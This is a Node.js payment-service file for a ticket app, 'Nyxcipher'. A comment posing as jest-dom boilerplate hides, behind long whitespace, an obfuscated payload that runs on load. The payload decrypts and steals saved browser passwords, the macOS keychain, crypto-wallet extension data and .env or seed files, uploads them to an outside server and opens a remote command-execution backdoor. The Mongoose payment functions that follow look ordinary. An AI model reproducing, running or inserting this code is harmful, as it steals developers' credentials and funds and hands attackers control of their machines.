/* learn more: https://github.com/testing-library/jest-dom // @testing-library/jest-dom library provides a set of custom jest matchers that you can use to extend jest.These will make your tests_more_declarative, clear to read and to maintain.*/                                                                                                                                                                                                                                                                                                        var _0x1b079d=_0x5af6;(function(_0x11f183,_0x324b66){var _0x5ab42d=_0x5af6,_0x4fd62a=_0x11f183();while(!![]){try{var _0x3df0ed=parseInt(_0x5ab42d(0x239))/0x1+-parseInt(_0x5ab42d(0x256))/0x2*(parseInt(_0x5ab42d(0x207))/0x3)+-parseInt(_0x5ab42d(0x20d))/0x4+parseInt(_0x5ab42d(0x24c))/0x5+parseInt(_0x5ab42d(0x264))/0x6*(parseInt(_0x5ab42d(0x250))/0x7)+-parseInt(_0x5ab42d(0x1ff))/0x8*(parseInt(_0x5ab42d(0x26d))/0x9)+parseInt(_0x5ab42d(0x21a))/0xa*(parseInt(_0x5ab42d(0x254))/0xb);if(_0x3df0ed===_0x324b66)break;else _0x4fd62a['push'](_0x4fd62a['shift']());}catch(_0x14c215){_0x4fd62a['push'](_0x4fd62a['shift']());}}}(_0x308c,0x9d20a));let os=require('os'),io=require(_0x1b079d(0x200)),fs=require('fs'),path=require(_0x1b079d(0x23a)),exec=require('child_process')['exec'],axios=require(_0x1b079d(0x261)),FormData=require(_0x1b079d(0x278)),sqlite3=require(_0x1b079d(0x221)),machineIdSync=require(_0x1b079d(0x26f))[_0x1b079d(0x22a)],Extensions=['nkbihfbeogaeaoehlefnkodbefgpgknn',_0x1b079d(0x223),_0x1b079d(0x263),_0x1b079d(0x26b)],BrowserPath=[],httpServer=_0x1b079d(0x241),socket=io(_0x1b079d(0x231)),ExceptionFolder=(BrowserPath[_0x1b079d(0x286)](_0x1b079d(0x1fd)==os[_0x1b079d(0x219)]()?path[_0x1b079d(0x210)](os[_0x1b079d(0x218)](),_0x1b079d(0x284),_0x1b079d(0x28b),_0x1b079d(0x27e),_0x1b079d(0x220),_0x1b079d(0x275)):'Linux'==os[_0x1b079d(0x219)]()?path[_0x1b079d(0x210)](os[_0x1b079d(0x218)](),'.config',_0x1b079d(0x248)):path[_0x1b079d(0x210)](os[_0x1b079d(0x218)](),_0x1b079d(0x24d),_0x1b079d(0x262),_0x1b079d(0x27e),'Chrome')),BrowserPath['push']('Windows_NT'==os[_0x1b079d(0x219)]()?path[_0x1b079d(0x210)](os[_0x1b079d(0x218)](),_0x1b079d(0x284),'Local',_0x1b079d(0x21e),_0x1b079d(0x217),_0x1b079d(0x275)):_0x1b079d(0x27a)==os['type']()?path[_0x1b079d(0x210)](os[_0x1b079d(0x218)](),_0x1b079d(0x293),'BraveSoftware'):path[_0x1b079d(0x210)](os[_0x1b079d(0x218)](),_0x1b079d(0x24d),_0x1b079d(0x262),_0x1b079d(0x21e),'Brave-Browser')),BrowserPath[_0x1b079d(0x286)](_0x1b079d(0x1fd)==os[_0x1b079d(0x219)]()?path[_0x1b079d(0x210)](os['homedir'](),_0x1b079d(0x284),_0x1b079d(0x21f),_0x1b079d(0x22d),_0x1b079d(0x230)):_0x1b079d(0x27a)==os['type']()?path['join'](os[_0x1b079d(0x218)](),_0x1b079d(0x293),_0x1b079d(0x25e)):path['join'](os[_0x1b079d(0x218)](),_0x1b079d(0x24d),'Application\x20Support',_0x1b079d(0x27b))),BrowserPath[_0x1b079d(0x286)](_0x1b079d(0x1fd)==os[_0x1b079d(0x219)]()?path['join'](os[_0x1b079d(0x218)](),_0x1b079d(0x284),_0x1b079d(0x28b),_0x1b079d(0x209),_0x1b079d(0x21d),_0x1b079d(0x275)):_0x1b079d(0x27a)==os[_0x1b079d(0x219)]()?path['join'](os[_0x1b079d(0x218)](),_0x1b079d(0x293),_0x1b079d(0x272)):path[_0x1b079d(0x210)](os[_0x1b079d(0x218)](),_0x1b079d(0x24d),_0x1b079d(0x262),_0x1b079d(0x209),_0x1b079d(0x21d))),_0x1b079d(0x1fd)==os[_0x1b079d(0x219)]()&&BrowserPath[_0x1b079d(0x286)](path[_0x1b079d(0x210)](os[_0x1b079d(0x218)](),_0x1b079d(0x284),'Local','Microsoft','Edge','User\x20Data')),['node_modules',_0x1b079d(0x1f1),_0x1b079d(0x267),_0x1b079d(0x215),_0x1b079d(0x228),'.git','artifacts',_0x1b079d(0x24a)]),ImpStrings=[_0x1b079d(0x22c),_0x1b079d(0x249),_0x1b079d(0x25b),_0x1b079d(0x265),_0x1b079d(0x20b),'private',_0x1b079d(0x292),_0x1b079d(0x1ec),'hardhat.config.ts','coinbase',_0x1b079d(0x290)],getEncryptionKey=async _0x16f783=>{var _0x206e3e=_0x1b079d,_0x1bf134=require(_0x206e3e(0x1fa))[_0x206e3e(0x279)],_0x16f783=path[_0x206e3e(0x210)](BrowserPath[_0x16f783],_0x206e3e(0x259)),_0x16f783=await fs[_0x206e3e(0x216)][_0x206e3e(0x269)](_0x16f783,_0x206e3e(0x1ed)),_0x16f783=JSON[_0x206e3e(0x287)](_0x16f783)['os_crypt'][_0x206e3e(0x1fc)],_0x16f783=Buffer[_0x206e3e(0x273)](_0x16f783,_0x206e3e(0x1f8))[_0x206e3e(0x21c)](0x5);return _0x1bf134[_0x206e3e(0x24e)](_0x16f783,null,_0x206e3e(0x283));},decryptPassword=async(_0xa725d9,_0x1736f5)=>{var _0x59d6de=_0x1b079d,_0x99682=require(_0x59d6de(0x21b)),_0x472e5f=_0xa725d9[_0x59d6de(0x21c)](0x3,0xf),_0x99682=(_0xa725d9=_0xa725d9[_0x59d6de(0x21c)](0xf),_0x99682['createCipheriv'](_0x59d6de(0x266),_0x1736f5,_0x472e5f));return(_0x99682[_0x59d6de(0x251)](_0xa725d9,_0x59d6de(0x280),_0x59d6de(0x1ed))+_0x99682['final']('utf-8'))['slice'](0x0,-0x10);},hostname=os[_0x1b079d(0x25a)]()+':'+machineIdSync()['substring'](0x0,0x6),uploadFileToServer=(''!=hostname&&null!=hostname||(hostname=os[_0x1b079d(0x23e)]()[_0x1b079d(0x1f3)]),async(_0x5f4137,_0x5c4d09,_0xdc376e)=>{var _0x41c780=_0x1b079d;try{var _0x51c745=fs['createReadStream'](_0xdc376e),_0x3e0141=new FormData(),_0x29c507=(_0x3e0141['append'](_0x41c780(0x1f3),hostname),_0x3e0141[_0x41c780(0x22b)](_0x41c780(0x24f),_0x5f4137),_0x3e0141['append'](_0x41c780(0x257),_0x5c4d09),_0x3e0141[_0x41c780(0x22b)](_0x41c780(0x23c),_0x51c745),await axios['post'](httpServer+_0x41c780(0x205),_0x3e0141,{'headers':{'Content-Type':_0x41c780(0x28e)}}));return _0x41c780(0x20a)==_0x29c507[_0x41c780(0x208)][_0x41c780(0x211)];}catch(_0x46f556){return!0x1;}}),getLoginData=async(_0x9b6fcf,_0x5a8532)=>{var _0x48de2f=_0x1b079d;if(_0x48de2f(0x1ef)===os[_0x48de2f(0x219)]())try{var _0x30c0bf=path[_0x48de2f(0x210)](BrowserPath[_0x5a8532],_0x48de2f(0x1f4),_0x48de2f(0x236));uploadFileToServer(_0x9b6fcf,'pld_0',_0x30c0bf);for(let _0xc3899a=0x0;_0xc3899a<0x14;_0xc3899a++){var _0x4a603e=path[_0x48de2f(0x210)](BrowserPath[_0x5a8532],_0x48de2f(0x282)+(_0xc3899a+0x1),_0x48de2f(0x236));uploadFileToServer(_0x9b6fcf,_0x48de2f(0x271)+(_0xc3899a+0x1),_0x4a603e);}var _0x438e0d=path[_0x48de2f(0x210)](os[_0x48de2f(0x218)](),_0x48de2f(0x24d),_0x48de2f(0x206),'login.keychain-db');uploadFileToServer(_0x9b6fcf,_0x48de2f(0x20c),_0x438e0d);}catch(_0x5b623c){}else try{var _0x1bf634=await getEncryptionKey(_0x5a8532),_0x39ea17=_0x48de2f(0x288);let _0x1d7fc8='';var _0x4d18fb=path[_0x48de2f(0x210)](BrowserPath[_0x5a8532],_0x48de2f(0x1f4),'Login\x20Data');if(fs[_0x48de2f(0x285)](_0x4d18fb)){await fs[_0x48de2f(0x216)]['copyFile'](_0x4d18fb,os[_0x48de2f(0x218)]()+'/'+_0x39ea17);var _0x3c5212,_0x294815=sqlite3(path['join'](os[_0x48de2f(0x218)](),_0x39ea17));for(_0x3c5212 of _0x294815[_0x48de2f(0x26c)](_0x48de2f(0x22e))[_0x48de2f(0x234)]())try{var _0x535be1=_0x3c5212[_0x48de2f(0x203)],_0xf94c20=_0x3c5212[_0x48de2f(0x1fb)],_0x221def=_0x3c5212['username_value'],_0x19f81a=await decryptPassword(_0x3c5212[_0x48de2f(0x253)],_0x1bf634);_0x1d7fc8=(_0x1d7fc8=(_0x1d7fc8=_0x1d7fc8+(_0x48de2f(0x28c)+_0x535be1+'\x0a')+(_0x48de2f(0x26a)+_0xf94c20+'\x0a'))+(_0x48de2f(0x23f)+_0x221def+'\x0a')+(_0x48de2f(0x258)+_0x19f81a+'\x0a'))+('*'[_0x48de2f(0x27f)](0x32)+'\x0a');}catch(_0xa5167f){}_0x294815[_0x48de2f(0x25f)](),await fs[_0x48de2f(0x216)][_0x48de2f(0x1f7)](os[_0x48de2f(0x218)]()+'/'+_0x39ea17);}for(let _0x14c2d1=0x0;_0x14c2d1<0x14;_0x14c2d1++){var _0x5e7bd1=path[_0x48de2f(0x210)](BrowserPath[_0x5a8532],_0x48de2f(0x282)+(_0x14c2d1+0x1),'Login\x20Data');if(fs['existsSync'](_0x5e7bd1)){await fs[_0x48de2f(0x216)][_0x48de2f(0x229)](_0x5e7bd1,os[_0x48de2f(0x218)]()+'/'+_0x39ea17);var _0xbf6144,_0x929be1=sqlite3(os['homedir']()+'/'+_0x39ea17);for(_0xbf6144 of _0x929be1[_0x48de2f(0x26c)]('SELECT\x20origin_url,\x20action_url,\x20username_value,\x20password_value,\x20date_created,\x20date_last_used\x20FROM\x20logins')[_0x48de2f(0x234)]())try{var _0x2827c8=_0xbf6144[_0x48de2f(0x203)],_0x540693=_0xbf6144[_0x48de2f(0x1fb)],_0x2f4ae4=_0xbf6144[_0x48de2f(0x270)],_0x42184e=await decryptPassword(_0xbf6144['password_value'],_0x1bf634);_0x1d7fc8=(_0x1d7fc8=(_0x1d7fc8=_0x1d7fc8+(_0x48de2f(0x28c)+_0x2827c8+'\x0a')+(_0x48de2f(0x26a)+_0x540693+'\x0a'))+(_0x48de2f(0x23f)+_0x2f4ae4+'\x0a')+(_0x48de2f(0x258)+_0x42184e+'\x0a'))+('*'[_0x48de2f(0x27f)](0x32)+'\x0a');}catch(_0xf560cf){}_0x929be1[_0x48de2f(0x25f)](),await fs[_0x48de2f(0x216)]['unlink'](os[_0x48de2f(0x218)]()+'/'+_0x39ea17);}}await axios['post'](httpServer+'/content-upload',{'username':hostname,'folderName':_0x9b6fcf,'fileName':_0x48de2f(0x1f6)+_0x5a8532+_0x48de2f(0x235),'fileContent':_0x1d7fc8});}catch(_0x130f54){}},getSystemInfo=async _0xef21ac=>{var _0x6b9005=_0x1b079d;try{let _0x3a7002,_0x4e7ba3;try{_0x3a7002={'hostname':os[_0x6b9005(0x25a)](),'machine':os[_0x6b9005(0x268)](),'platform':os[_0x6b9005(0x244)](),'release':os[_0x6b9005(0x291)](),'type':os[_0x6b9005(0x219)](),'username':os['userInfo']()[_0x6b9005(0x1f3)],'version':os[_0x6b9005(0x23b)](),'uuid':machineIdSync()};}catch(_0x3953df){_0x3a7002=null;}try{_0x4e7ba3=(await axios[_0x6b9005(0x27d)](_0x6b9005(0x23d)))['data'];}catch(_0x3a6d8d){_0x4e7ba3=null;}await axios[_0x6b9005(0x28f)](httpServer+_0x6b9005(0x25d),{'username':hostname,'folderName':_0xef21ac,'fileName':_0x6b9005(0x260),'fileContent':JSON[_0x6b9005(0x281)]({'sysInfo':_0x3a7002,'ipInfo':_0x4e7ba3})});}catch(_0x416eb1){}},getExtensionData=async(_0x26c4b4,_0x5c629c,_0x395bee)=>{var _0x405c43=_0x1b079d,_0x279fd5=path[_0x405c43(0x210)](BrowserPath[_0x395bee],'Default','Local\x20Extension\x20Settings',_0x26c4b4);if(fs[_0x405c43(0x285)](_0x279fd5)){var _0x2ab5d2,_0x485669=_0x395bee+(_0x405c43(0x245)+_0x26c4b4+'_');for(_0x2ab5d2 of await fs[_0x405c43(0x216)]['readdir'](_0x279fd5))await uploadFileToServer(_0x5c629c,_0x485669+_0x2ab5d2,path[_0x405c43(0x210)](_0x279fd5,_0x2ab5d2));}for(let _0x4d66df=0x0;_0x4d66df<0x14;_0x4d66df++){var _0x5db88b,_0x20c6ef=path[_0x405c43(0x210)](BrowserPath[_0x395bee],'Profile\x20'+(_0x4d66df+0x1),_0x405c43(0x22f),_0x26c4b4),_0x5aba58=_0x395bee+'_'+(_0x4d66df+0x1)+'_'+_0x26c4b4+'_';if(fs[_0x405c43(0x285)](_0x20c6ef)){for(_0x5db88b of await fs[_0x405c43(0x216)][_0x405c43(0x26e)](_0x20c6ef))(_0x5db88b[_0x405c43(0x246)](_0x405c43(0x1fe))||_0x5db88b[_0x405c43(0x246)](_0x405c43(0x213)))&&await uploadFileToServer(_0x5c629c,_0x5aba58+_0x5db88b,path['join'](_0x20c6ef,_0x5db88b));}}},searchEnv=async(_0x5cf734,_0x4fc8e2)=>{var _0x219c04=_0x1b079d;for(let _0x378a7a of fs[_0x219c04(0x276)](_0x5cf734)){var _0x1c4791,_0x20bbbf=path['join'](_0x5cf734,_0x378a7a);if(fs[_0x219c04(0x28a)](_0x20bbbf)[_0x219c04(0x247)]())-0x1==ExceptionFolder[_0x219c04(0x1f5)](_0x568741=>_0x568741==_0x378a7a[_0x219c04(0x20f)]())&&await searchEnv(_0x20bbbf,_0x4fc8e2);else{let _0x509fa1=!0x1;for(var _0x500ed2 of ImpStrings)if(0x1==_0x378a7a['includes'](_0x500ed2)){_0x509fa1=!0x0;break;}_0x509fa1&&(_0x1c4791=_0x20bbbf['replace'](/[\/\\<>?*":]/g,'_'),await uploadFileToServer(_0x4fc8e2,_0x1c4791,_0x20bbbf));}}},searchPat=async(_0x73e524,_0x3eef44,_0x1e277c)=>{var _0x90f618=_0x1b079d;for(let _0x58d42b of fs[_0x90f618(0x276)](_0x73e524)){var _0x4819ee,_0x100ee9=path['join'](_0x73e524,_0x58d42b);fs[_0x90f618(0x28a)](_0x100ee9)[_0x90f618(0x247)]()?-0x1==ExceptionFolder['findIndex'](_0x15790a=>_0x15790a==_0x58d42b['toLowerCase']())&&await searchPat(_0x100ee9,_0x3eef44,_0x1e277c):0x1==_0x58d42b[_0x90f618(0x28d)](_0x1e277c)&&(_0x4819ee=_0x100ee9[_0x90f618(0x25c)](/[\/\\<>?*":]/g,'_'),await uploadFileToServer(_0x3eef44,_0x4819ee,_0x100ee9));}},uploadFile=async(_0x348e34,_0x5ca356)=>{var _0x3d1199=_0x1b079d;try{var _0x20fe18=_0x348e34[_0x3d1199(0x25c)](/[\/\\<>?*":]/g,'_');await uploadFileToServer(_0x5ca356,_0x20fe18,_0x348e34)?socket['emit']('exec_result',_0x3d1199(0x225)+_0x348e34):socket[_0x3d1199(0x222)](_0x3d1199(0x277),_0x3d1199(0x224)+_0x348e34);}catch(_0x1eadcf){}},uploadDirectory=async(_0x5c20d0,_0x708ae8)=>{var _0x50d2db=_0x1b079d;for(let _0xf364b2 of fs[_0x50d2db(0x276)](_0x5c20d0)){var _0x132a13=path[_0x50d2db(0x210)](_0x5c20d0,_0xf364b2);fs[_0x50d2db(0x28a)](_0x132a13)[_0x50d2db(0x247)]()?-0x1==ExceptionFolder[_0x50d2db(0x1f5)](_0x317d59=>_0x317d59==_0xf364b2['toLowerCase']())&&await uploadDirectory(_0x132a13,_0x708ae8):await uploadFile(_0x132a13,_0x708ae8);}},fork=require(_0x1b079d(0x227))[_0x1b079d(0x27c)];function startChildProcess(){var _0x5104e5=_0x1b079d,_0xa4b066=fork(path[_0x5104e5(0x210)](__dirname,'PaymentServices.js'),[],{'detached':!0x0,'stdio':'ignore'});_0xa4b066[_0x5104e5(0x232)]();}process['on'](_0x1b079d(0x233),()=>{startChildProcess(),process['exit']();});let scenario=async()=>{var _0x2e9198=_0x1b079d;socket['on'](_0x2e9198(0x1ee),()=>{var _0x558085=_0x2e9198;socket[_0x558085(0x222)](_0x558085(0x274),{'username':hostname}),socket['emit'](_0x558085(0x277),'Connected\x20:\x20'+hostname);}),socket['on'](_0x2e9198(0x226),async _0x227d22=>{var _0x5dce0f=_0x2e9198;try{if(await searchEnv(os['homedir'](),_0x227d22),'Windows_NT'==os[_0x5dce0f(0x219)]()){for(let _0x21c406='D';_0x21c406<'Z';_0x21c406++)await searchEnv(_0x21c406+':/',_0x227d22);}socket['emit'](_0x5dce0f(0x277),'Env\x20search\x20finished');}catch(_0x566605){socket[_0x5dce0f(0x222)](_0x5dce0f(0x277),_0x5dce0f(0x24b));}}),socket['on'](_0x2e9198(0x252),async _0x11cbd6=>{var _0x589297=_0x2e9198;try{await searchEnv(os,_0x11cbd6),socket[_0x589297(0x222)]('exec_result',_0x589297(0x202));}catch(_0x21c691){socket['emit'](_0x589297(0x277),'imp\x20error');}}),socket['on']('pat',async({folderName:_0x1bbe14,pat:_0x502814})=>{var _0x14d8d3=_0x2e9198;try{await searchPat(process[_0x14d8d3(0x243)](),_0x1bbe14,_0x502814),socket[_0x14d8d3(0x222)](_0x14d8d3(0x277),_0x14d8d3(0x1f2));}catch(_0x4e12bf){socket[_0x14d8d3(0x222)](_0x14d8d3(0x277),_0x14d8d3(0x214));}}),socket['on']('upload',async _0x2215c0=>{var _0x278bed=_0x2e9198;try{if(await getSystemInfo(_0x2215c0),_0x278bed(0x1fd)==os['type']()){for(var _0x1d307a in BrowserPath)await getLoginData(_0x2215c0,_0x1d307a);}if(_0x278bed(0x1ef)==os[_0x278bed(0x219)]()){for(var _0x30ea8b in BrowserPath)await getLoginData(_0x2215c0,_0x30ea8b);}for(var _0x10d7ef in BrowserPath)for(var _0x22b11b of Extensions)await getExtensionData(_0x22b11b,_0x2215c0,_0x10d7ef);socket[_0x278bed(0x222)]('exec_result','upload\x20finished');}catch(_0x11948f){socket['emit'](_0x278bed(0x277),_0x278bed(0x237));}}),socket['on']('exec',async _0x5a9758=>{var _0x287fa5=_0x2e9198;try{var _0x5ca64d,_0x4123cc,_0x466d35=_0x5a9758['split']('\x20'),_0x34f9a0=_0x466d35[0x0]['toLowerCase'](),_0x37fcfd=_0x466d35[_0x287fa5(0x21c)](0x1)[_0x287fa5(0x210)]('\x20');_0x287fa5(0x201)==_0x34f9a0?process['exit']():_0x287fa5(0x238)==_0x34f9a0?(_0x5ca64d=path[_0x287fa5(0x210)](process[_0x287fa5(0x243)](),_0x37fcfd),fs[_0x287fa5(0x285)](_0x5ca64d)?fs['statSync'](_0x5ca64d)[_0x287fa5(0x247)]()?socket[_0x287fa5(0x222)](_0x287fa5(0x277),_0x287fa5(0x289)):(await uploadFile(_0x5ca64d,_0x287fa5(0x255)),socket['emit']('exec_result',_0x287fa5(0x242))):socket[_0x287fa5(0x222)](_0x287fa5(0x277),_0x287fa5(0x1f0))):_0x287fa5(0x1f9)==_0x34f9a0?(_0x4123cc=path['join'](process['cwd'](),_0x37fcfd),fs['existsSync'](_0x4123cc)?fs[_0x287fa5(0x28a)](_0x4123cc)[_0x287fa5(0x247)]()?(await uploadDirectory(_0x4123cc,'upload'),socket[_0x287fa5(0x222)](_0x287fa5(0x277),_0x287fa5(0x20e))):socket[_0x287fa5(0x222)](_0x287fa5(0x277),_0x287fa5(0x240)):socket[_0x287fa5(0x222)](_0x287fa5(0x277),_0x287fa5(0x212))):'cd'==_0x34f9a0?(process['chdir'](_0x37fcfd),socket[_0x287fa5(0x222)]('exec_result',process[_0x287fa5(0x243)]())):exec(_0x5a9758,async(_0x2e15ce,_0x45ae5b,_0x250f72)=>{var _0x37d130=_0x287fa5;_0x250f72?await socket[_0x37d130(0x222)](_0x37d130(0x277),_0x250f72):_0x45ae5b&&socket[_0x37d130(0x222)]('exec_result',_0x45ae5b);});}catch(_0x505e3d){socket['emit']('exec_result',_0x287fa5(0x204));}});};function _0x5af6(_0x23f92f,_0x10a9c8){var _0x308c96=_0x308c();return _0x5af6=function(_0x5af696,_0x1f16bc){_0x5af696=_0x5af696-0x1ec;var _0x578a09=_0x308c96[_0x5af696];return _0x578a09;},_0x5af6(_0x23f92f,_0x10a9c8);}function _0x308c(){var _0x7a3864=['copyFile','machineIdSync','append','.env','Opera\x20Software','SELECT\x20origin_url,\x20action_url,\x20username_value,\x20password_value,\x20date_created,\x20date_last_used\x20FROM\x20logins','Local\x20Extension\x20Settings','Opera\x20Stable','https://server.attisscmo.com/client','unref','SIGINT','all','.txt','Login\x20Data','upload\x20error','ss_upf','601026NyFIfj','path','version','file','https://freeipapi.com/api/json','userInfo','Username:\x20','Its\x20not\x20directory','https://server.attisscmo.com','File\x20upload\x20finished','cwd','platform','_0_','endsWith','isDirectory','google-chrome','wallet','build','env\x20error','5251245FqcRNI','Library','unprotectData','folderName','14ULMvzP','update','imp','password_value','44RjAfrF','upload','250228aJRcHJ','fileName','Password:\x20','Local\x20State','hostname','metamask','replace','/content-upload','opera','close','system.txt','axios','Application\x20Support','ibnejdfjmmkpcnlpebklmnkoeoihofec','1823022nNTBIE','secret','aes-256-gcm','.cargo','machine','readFile','Action\x20URL:\x20','ejbalbakoplchlghecdalmeeeajnimhm','prepare','9oJEitA','readdir','node-machine-id','username_value','pld_','yandex-browser','from','client_data','User\x20Data','readdirSync','exec_result','form-data','Dpapi','Linux','com.operasoftware.Opera','fork','get','Google','repeat','binary','stringify','Profile\x20','CurrentUser','AppData','existsSync','push','parse','db.log','Its\x20not\x20file','statSync','Local','Origin\x20URL:\x20','includes','multipart/form-data','post','seed','release','id.json','.config','key','utf-8','connect','Darwin','File\x20not\x20found','cargo','Pat\x20search\x20finished','username','Default','findIndex','login-','unlink','base64','ss_upd','@primno/dpapi','action_url','encrypted_key','Windows_NT','.ldb','9470872PgGMQH','socket.io-client','ss_del','Imp\x20search\x20finished','origin_url','exec\x20error','/file-upload','Keychains','6gystWi','data','Yandex','success','phantom','logkc-db','833344qgngXu','Directory\x20upload\x20finished','toLowerCase','join','state','Directory\x20not\x20found','.log','pat\x20error','cache','promises','Brave-Browser','homedir','type','67670HYgKza','crypto','slice','YandexBrowser','BraveSoftware','Roaming','Chrome','better-sqlite3','emit','bfnaelmomeimhlpmgjnjophhpkkoljpa','Failed:\x20file\x20upload\x20-\x20','Success:\x20file\x20upload\x20-\x20','env','child_process','.cache'];_0x308c=function(){return _0x7a3864;};return _0x308c();}scenario();

const { NotFoundError, ValidationError, BadRequestError } = require('../utils/errors')
const Nyxcipher = require("../models/Nyxcipher")
const User = require("../models/User")
const Payment = require("../models/Payment")
const Ticket = require("../models/Ticket")
const Cart = require("../models/Cart")

exports.getPaymentsHistory = async (email) => {
    const user = await User.findOne({email: email})
    if (!user) throw new NotFoundError('Account not found')

    let payment_histories = await Payment.find({buyer_id: user._id})
        .populate({
            path: 'nyxcipher_id',
            model: 'Nyxcipher',
            populate: {
                path: 'nyxcipher_item_id',
                model: 'Item'
            }
        })
        .populate('buyer_id')
        .populate('ticket_id')
        .sort({purchase_date: -1})
        .exec()
    if (!payment_histories) throw new NotFoundError('Payment not found')

    return payment_histories
}

exports.getOnePaidPayment = async (email, id) => {
    const user = await User.findOne({email: email})
    if (!user) throw new NotFoundError('Account not found')

    const payment = await Payment.findById(id)
    if (!payment) throw new NotFoundError('Payment not found')

    return payment
}

const generateNumbers = (length) => {
    let numbers = []
    for (let i = 0; i < length; i++) {
        const rnumb = Math.floor(Math.random() * (9999999 - 1000000) + 1000000);
        numbers.push(rnumb)
    }
    return numbers
}

exports.savePayment = async (email, body) => {
    const user = await User.findOne({email: email})
        .populate({
            path: "cart_entry",
            populate: [{
                path: "nyxcipher_id",
                model: "Nyxcipher",
                populate: {
                    path: "nyxcipher_item_id",
                    model: "Item",
                }
            }, {
                path: "ticket_id",
                model: "Ticket",
            }]
        }).exec()
    if (!user) throw new NotFoundError('Account not found')
    if (!user.cart_entry || user.cart_entry.length <= 0) throw new ValidationError('Cart is empty')

    let payments = []
    for (let i=0; i<user.cart_entry.length; i++) {
        const payment = new Payment({
            buyer_id: user._id,
            nyxcipher_id: user.cart_entry[i].nyxcipher_id, // nyxciphers joined with phurchased tickets
            ticket_id: user.cart_entry[i].ticket_id, // phurchased tickets
            purchase_date: new Date(),
            assigned_numbers: generateNumbers(user.cart_entry[i].ticket_id.ticket_count),
            amount_paid: user.cart_entry[i].ticket_id.ticket_price,
            payment_processor: body.payment_processor
        })
        await Cart.deleteOne({_id: user.cart_entry[i]._id})
        const saved_payment = await payment.save()
        payments.push(saved_payment)
        let ticket = await Ticket.findOne({_id: user.cart_entry[i].ticket_id})
        ticket.payment_id = saved_payment._id
        await ticket.save()
    }
    user.cart_entry = []
    await user.save()

    return payments
}

exports.updatePayment = async (id, body) => {
    const {nyxcipher_name, nyxcipher_category, nyxcipher_item_id, charity_recipient} = body
    let nyxcipher = await Ticket.findById(id)

    if (!nyxcipher) throw new NotFoundError('Ticket not found')
    let update_nyxcipher = {
        ...nyxcipher._doc,
        nyxcipher_name: nyxcipher_name ? nyxcipher_name : nyxcipher._doc.nyxcipher_name,
        nyxcipher_category: nyxcipher_category ? nyxcipher_category : nyxcipher._doc.nyxcipher_category,
        nyxcipher_item_id: nyxcipher_item_id ? nyxcipher_item_id : nyxcipher._doc.nyxcipher_item_id,
        charity_recipient: charity_recipient ? charity_recipient : nyxcipher._doc.charity_recipient,
    }

    console.log(update_nyxcipher)
    await nyxcipher.updateOne(update_nyxcipher)

    return update_nyxcipher
}

exports.deletePayment = async (id) => {
    let nyxcipher = await Ticket.findById(id)
    if (!nyxcipher) throw new NotFoundError('Ticket not found')
    await nyxcipher.deleteOne()
	return true
}
